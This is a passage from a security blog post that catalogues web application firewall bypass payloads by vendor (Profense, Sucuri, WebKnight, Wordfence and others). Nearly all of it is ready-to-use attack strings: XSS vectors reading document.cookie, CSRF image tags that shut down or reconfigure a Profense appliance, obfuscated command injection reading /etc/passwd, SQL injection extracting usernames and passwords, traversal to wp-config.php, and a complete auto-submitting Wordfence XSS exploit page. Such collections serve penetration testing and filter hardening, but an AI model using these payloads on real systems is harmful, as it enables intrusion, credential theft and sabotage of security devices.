<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@keyframes a&#123;&#125;b&#123;animation:a;&#125;&lt;/style&gt;&lt;b/onanimationstart=prompt`$&#123;document.domain&#125;&amp;#x60;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Ishaq Mohammed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee+loop=1+width=0+onfinish=&#x27;new+Function`al\ert\`1\``&#x27;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Profense"><a href="#Profense" class="headerlink" title="Profense"></a><strong>Profense</strong></h3><p>GET Type CSRF Attack by @Michael Brooks (&gt;= v.2.6.2)</p>
<p>Turn off Proface Machine</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=https://host:2000/ajax.html?action=shutdown&gt;</span><br></pre></td></tr></table></figure>

<p>Add a proxy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=https://10.1.1.199:2000/ajax.html?vhost_proto=http&amp;vhost=vhost.com&amp;vhost_port=80&amp;rhost_proto=http&amp;rhost=10.1.1.1&amp;rhost_port=80&amp;mode_pass=on&amp;xmle=on&amp;enable_file_upload=on&amp;static_passthrough=on&amp;action=add&amp;do=save&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Michael Brooks (&gt;= v.2.6.2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://host:2000/proxy.html?action=manage&amp;main=log&amp;show=deny_log&amp;proxy=&gt;&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @EnableSecurity (&gt;= v2.4)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%3CEvil%20script%20goes%20here%3E=%0AByPass</span><br><span class="line">%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E</span><br></pre></td></tr></table></figure>

<h3 id="QuickDefense"><a href="#QuickDefense" class="headerlink" title="QuickDefense"></a><strong>QuickDefense</strong></h3><p>XSS Bypass by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?&lt;input type=&quot;search&quot; onsearch=&quot;aler\u0074(1)&quot;&gt;</span><br><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Sucuri"><a href="#Sucuri" class="headerlink" title="Sucuri"></a><strong>Sucuri</strong></h3><p>Smuggling RCE Payloads by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/??t+/???/??ss??</span><br></pre></td></tr></table></figure>

<p>Obfuscating RCE Payloads by @theMiddle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;+cat+/e&#x27;tc/pass&#x27;wd</span><br><span class="line">c\\a\\t+/et\\c/pas\\swd</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Luka</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;input/onauxclick=&quot;[1].map(prompt)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:text/html,&lt;form action=https://brutelogic.com.br/xss-cp.php method=post&gt;</span><br><span class="line">&lt;input type=hidden name=a value=&quot;&lt;img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h3 id="URLScan"><a href="#URLScan" class="headerlink" title="URLScan"></a><strong>URLScan</strong></h3><p>Directory Traversal by @ZeQ3uL (&lt;= v3.1) (Only on ASP.NET)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host.com/test.asp?file=.%./bla.txt</span><br></pre></td></tr></table></figure>

<h3 id="WebARX"><a href="#WebARX" class="headerlink" title="WebARX"></a><strong>WebARX</strong></h3><p>Cross Site Scripting by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a69/onauxclick=open&amp;#40&amp;#41&gt;rightclickhere</span><br></pre></td></tr></table></figure>

<h3 id="WebKnight"><a href="#WebKnight" class="headerlink" title="WebKnight"></a><strong>WebKnight</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(2)&gt;</span><br><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onwheel=prompt(1)&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0 union(select 1,username,password from(users))</span><br><span class="line">0 union(select 1,@@hostname,@@datadir)</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @Aatif Khan (v4.1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(1)&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>SQLi Bypass by @ZeQ3uL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</span><br></pre></td></tr></table></figure>

<h3 id="Wordfence"><a href="#Wordfence" class="headerlink" title="Wordfence"></a><strong>Wordfence</strong></h3><p>XSS Bypass by @brute Logic</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javas&amp;#99;ript:alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/**/href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&amp;colon;/**/alert()/**/&gt;click</span><br></pre></td></tr></table></figure>

<p>HTML Injection by @Voxel</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</span><br></pre></td></tr></table></figure>

<p>XSS Exploit by @MustLive (&gt;= v3.3.5)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Wordfence Security XSS exploit (C) 2012 MustLive.</span><br><span class="line">http://websecurity.com.ua&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onLoad=&quot;document.hack.submit()&quot;&gt;</span><br><span class="line">&lt;form name=&quot;hack&quot; action=&quot;http://site/?_wfsf=unlockEmail&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;email&quot;</span><br><span class="line">value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>Other XSS Bypasses</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meter onmouseover=&quot;alert(1)&quot;</span><br><span class="line">&#x27;&quot;&gt;&gt;&lt;div&gt;&lt;meter onmouseover=&quot;alert(1)&quot;&lt;/div&gt;&quot;</span><br><span class="line">&gt;&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Apache-Generic"><a href="#Apache-Generic" class="headerlink" title="Apache Generic"></a><strong>Apache Generic</strong></h3><p>Writing method type in lowercase by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get /login HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>

<h3 id="IIS-Generic"><a href="#IIS-Generic" class="headerlink" title="IIS Generic"></a><strong>IIS Generic</strong></h3><p>Tabs before method by @i_bo0om</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /login.php HTTP/1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css"></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://ckcah.github.io">bosch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://ckcah.github.io/2020/05/02/waf-study-1/">https://ckcah.github.io/2020/05/02/waf-study-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/">安全杂项</a></div><div class="post_share"><div class="social-share" data-image="https://i.pinimg.com/236x/d1/86/94/d186944fb9da1b4e080837a07cea8029.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/05/02/wpscan/"><img class="prev-cover" src="https://i.pinimg.com/236x/c9/a3/2f/c9a32fbeec8d43d6e18e40bd7770af54.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">wpscan</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/02/%E6%94%BB%E9%98%B2%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2019/07/14/16/27/pen-4337521__340.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">攻防测试手册</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/04/06/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B9%B3%E5%8F%B0/" title="威胁情报平台"><img class="cover" src="https://cdn.pixabay.com/photo/2016/11/23/14/37/blur-1853262__340.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-06</div><div class="title">威胁情报平台</div></div></a></div><div><a href="/2020/09/10/web%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" title="web总结(持续更新)"><img class="cover" src="https://cdn.pixabay.com/photo/2021/07/31/08/22/network-6511448__340.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-10</div><div class="title">web总结(持续更新)</div></div></a></div><div><a href="/2020/07/24/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="域名信息搜集"><img class="cover" src="https://i.pinimg.com/236x/f9/95/c3/f995c3006ecfa3d809f194c73a326c17.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-24</div><div class="title">域名信息搜集</div></div></a></div><div><a href="/2020/05/26/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/" title="绕过CDN寻找真实IP的8种方法"><img class="cover" src="https://i.pinimg.com/236x/18/4b/fb/184bfbac84ac0e5434214dc330ac8c3c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-26</div><div class="title">绕过CDN寻找真实IP的8种方法</div></div></a></div><div><a href="/2020/05/19/2016-2019%E5%B9%B4%E8%A2%AB%E5%88%A9%E7%94%A8%E6%9C%80%E5%A4%9A%E7%9A%8410%E4%B8%AA%E6%BC%8F%E6%B4%9E/" title="2016-2019年被利用最多的10个漏洞"><img class="cover" src="https://cdn.pixabay.com/photo/2014/10/05/19/02/binary-code-475664__340.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-19</div><div class="title">2016-2019年被利用最多的10个漏洞</div></div></a></div><div><a href="/2020/05/16/weblogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="weblogic系列漏洞整理"><img class="cover" src="https://cdn.pixabay.com/photo/2020/03/06/08/00/laptop-4906312__340.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-16</div><div class="title">weblogic系列漏洞整理</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Gitalk</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://ckcah.github.io/images/title1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">bosch</div><div class="author-info__description">一个不自量力的人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">98</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">20</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ckcah"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ckcah" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:bcheng490@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">不管怎么样，总要追求点什么，多累一点才好</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0X00-Fuzz-%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">0X00  Fuzz&#x2F;爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X01-%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">0X01  正则绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B-bypass"><span class="toc-number">2.1.</span> <span class="toc-text">黑名单检测&#x2F;bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-Step-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">• Step 1:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X02-%E6%B7%B7%E6%B7%86-%E7%BC%96%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">0X02    混淆&#x2F;编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X04-HTTP-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">4.</span> <span class="toc-text">0X04    HTTP 参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">手法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0X05-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">5.</span> <span class="toc-text">0X05    浏览器的缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Charset-Bugs"><span class="toc-number">5.1.</span> <span class="toc-text">Charset Bugs:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Null-%E7%A9%BA%E5%AD%97%E8%8A%82"><span class="toc-number">5.2.</span> <span class="toc-text">Null 空字节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E9%94%99%E8%AF%AF"><span class="toc-number">5.3.</span> <span class="toc-text">解析错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicode-%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">5.4.</span> <span class="toc-text">Unicode 分隔符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E9%9D%9E%E5%85%B8%E5%9E%8B%E7%AD%89%E6%95%88%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.</span> <span class="toc-text">使用其他非典型等效语法结构替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8SSL-TLS%E5%AF%86%E7%A0%81"><span class="toc-number">7.</span> <span class="toc-text">滥用SSL&#x2F;TLS密码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8-DNS-%E8%AE%B0%E5%BD%95"><span class="toc-number">8.</span> <span class="toc-text">滥用 DNS 记录:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%AC%BA%E9%AA%97"><span class="toc-number">9.</span> <span class="toc-text">请求头欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-Dorks-Approach"><span class="toc-number">10.</span> <span class="toc-text">Google Dorks Approach:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95"><span class="toc-number">10.1.</span> <span class="toc-text">搜索语法:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Normal-search"><span class="toc-number">10.2.</span> <span class="toc-text">Normal search:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-%E6%8B%93%E5%B1%95Bypass%E5%A7%BF%E5%8A%BF"><span class="toc-number"></span> <span class="toc-text">0X06  拓展Bypass姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Airlock-Ergon"><span class="toc-number">1.</span> <span class="toc-text">Airlock Ergon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Barracuda"><span class="toc-number">2.</span> <span class="toc-text">Barracuda</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cerber-WordPress"><span class="toc-number">3.</span> <span class="toc-text">Cerber (WordPress)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Citrix-NetScaler"><span class="toc-number">4.</span> <span class="toc-text">Citrix NetScaler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Comodo"><span class="toc-number">5.</span> <span class="toc-text">Comodo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DotDefender"><span class="toc-number">6.</span> <span class="toc-text">DotDefender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fortinet-Fortiweb"><span class="toc-number">7.</span> <span class="toc-text">Fortinet Fortiweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#F5-ASM"><span class="toc-number">8.</span> <span class="toc-text">F5 ASM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#F5-BIG-IP"><span class="toc-number">9.</span> <span class="toc-text">F5 BIG-IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#F5-FirePass"><span class="toc-number">10.</span> <span class="toc-text">F5 FirePass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ModSecurity"><span class="toc-number">11.</span> <span class="toc-text">ModSecurity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Imperva"><span class="toc-number">12.</span> <span class="toc-text">Imperva</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kona-SiteDefender"><span class="toc-number">13.</span> <span class="toc-text">Kona SiteDefender</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Profense"><span class="toc-number">14.</span> <span class="toc-text">Profense</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QuickDefense"><span class="toc-number">15.</span> <span class="toc-text">QuickDefense</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sucuri"><span class="toc-number">16.</span> <span class="toc-text">Sucuri</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLScan"><span class="toc-number">17.</span> <span class="toc-text">URLScan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebARX"><span class="toc-number">18.</span> <span class="toc-text">WebARX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebKnight"><span class="toc-number">19.</span> <span class="toc-text">WebKnight</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Wordfence"><span class="toc-number">20.</span> <span class="toc-text">Wordfence</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Generic"><span class="toc-number">21.</span> <span class="toc-text">Apache Generic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-Generic"><span class="toc-number">22.</span> <span class="toc-text">IIS Generic</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/02/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E4%B9%A0/" title="Android逆向基础知识补习"><img src="https://cdn.pixabay.com/photo/2017/06/20/23/15/coffee-2425303__340.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Android逆向基础知识补习"/></a><div class="content"><a class="title" href="/2022/05/02/Android%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E4%B9%A0/" title="Android逆向基础知识补习">Android逆向基础知识补习</a><time datetime="2022-05-02T11:58:16.000Z" title="Created 2022-05-02 19:58:16">2022-05-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/02/%E5%8F%96%E8%AF%81-%E4%BB%8E%E5%B0%8F%E7%99%BD%E5%BC%80%E5%A7%8B/" title="取证-从小白开始"><img src="https://i.pinimg.com/236x/11/3b/ed/113beda9bfdd5494b3101c4d0e5aa95e.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="取证-从小白开始"/></a><div class="content"><a class="title" href="/2022/05/02/%E5%8F%96%E8%AF%81-%E4%BB%8E%E5%B0%8F%E7%99%BD%E5%BC%80%E5%A7%8B/" title="取证-从小白开始">取证-从小白开始</a><time datetime="2022-05-02T11:04:39.000Z" title="Created 2022-05-02 19:04:39">2022-05-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/01/%E8%B4%A7%E5%B8%81%E6%88%98%E4%BA%89-%E5%AE%8B%E9%B8%BF%E5%85%B5%E8%A7%82%E5%90%8E%E6%84%9F/" title="货币战争-宋鸿兵观后感"><img src="https://cdn.pixabay.com/photo/2016/03/27/18/54/technology-1283624__340.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="货币战争-宋鸿兵观后感"/></a><div class="content"><a class="title" href="/2022/05/01/%E8%B4%A7%E5%B8%81%E6%88%98%E4%BA%89-%E5%AE%8B%E9%B8%BF%E5%85%B5%E8%A7%82%E5%90%8E%E6%84%9F/" title="货币战争-宋鸿兵观后感">货币战争-宋鸿兵观后感</a><time datetime="2022-05-01T08:16:51.000Z" title="Created 2022-05-01 16:16:51">2022-05-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/28/%E5%A6%82%E4%BD%95%E8%AF%BB%E7%A0%94%E6%8A%A5/" title="如何读研报"><img src="https://i.pinimg.com/236x/87/3e/ca/873eca638a8e5c7084eb853d12e5ce70.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何读研报"/></a><div class="content"><a class="title" href="/2022/04/28/%E5%A6%82%E4%BD%95%E8%AF%BB%E7%A0%94%E6%8A%A5/" title="如何读研报">如何读研报</a><time datetime="2022-04-28T00:20:05.000Z" title="Created 2022-04-28 08:20:05">2022-04-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/27/%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%90%86%E8%8A%92%E6%A0%BC%E7%9A%84%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" title="关于查理芒格的一篇文章"><img src="https://i.pinimg.com/236x/c2/cf/00/c2cf0052ca3a899b92249b14f3b9880f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于查理芒格的一篇文章"/></a><div class="content"><a class="title" href="/2022/04/27/%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%90%86%E8%8A%92%E6%A0%BC%E7%9A%84%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" title="关于查理芒格的一篇文章">关于查理芒格的一篇文章</a><time datetime="2022-04-27T11:18:33.000Z" title="Created 2022-04-27 19:18:33">2022-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By bosch</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" 